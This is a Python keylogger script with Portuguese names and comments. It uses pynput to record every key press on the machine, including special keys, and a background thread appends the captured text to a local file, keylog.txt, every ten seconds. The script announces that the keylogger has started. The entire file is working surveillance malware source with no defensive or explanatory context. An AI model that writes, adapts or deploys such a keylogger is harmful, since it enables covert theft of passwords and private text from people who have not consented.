import pynput
from pynput.keyboard import Key, Listener
import threading
import time
import os

log = ""
arquivo_log = "keylog.txt"

def capturar_tecla(tecla):
    global log
    if hasattr(tecla, 'char'):
        log += tecla.char
    elif tecla == Key.space:
        log += " "
    elif tecla == Key.enter:
        log += "\n"
    elif tecla == Key.tab:
        log += "\t"
    else:
        log += f"[{tecla}]"

def salvar_log():
    global log
    with open(arquivo_log, "a") as f:
        f.write(log)
    log = ""

def iniciar_keylogger():
    with Listener(on_press=capturar_tecla) as listener:
        listener.join()

if __name__ == "__main__":
    # Thread para salvar log periodicamente
    def salvar_periodico():
        while True:
            time.sleep(10)  # Salva a cada 10 segundos
            salvar_log()
    
    thread_salvar = threading.Thread(target=salvar_periodico)
    thread_salvar.daemon = True
    thread_salvar.start()
    
    print("Keylogger iniciado. Pressione teclas para testar. CTRL+C para parar.")
    iniciar_keylogger()
